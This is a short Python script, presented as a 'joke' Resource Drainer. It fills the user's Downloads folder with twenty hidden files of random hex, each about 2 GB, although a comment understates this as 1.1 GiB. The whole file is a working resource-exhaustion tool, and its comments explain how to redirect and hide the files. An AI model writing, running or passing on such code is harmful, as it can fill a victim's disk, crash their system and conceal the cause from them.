# This is a joke program that could crash your computer so be careful broski
# Resource Drainer, the program to drain your CPU and Storage!
import os
import time
import secrets
# valk is how many files you want to make
valk = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
# change x value to how much resources you want to drain (More value = more GiB)
x = (128**4)*2 # (128**4)*2 = 1,073,741,824 bytes or 1.1 GiB

for i in range(len(valk)):
 home = os.path.expanduser('~')
 downloads_folder = os.path.join(home, 'Downloads') # Change this 2 dir path u want to fill, E.g Documents
 if not os.path.exists(downloads_folder):
     os.mkdir(downloads_folder)
 file_name = f".Test{valk[i]}.txt" # You can make these hidden by adding . at the beginning of the file name
 file_path = os.path.join(downloads_folder, file_name)
 with open(file_path, 'w') as new_file:
    new_file.write(secrets.token_hex(x))
 time.sleep(0.5)
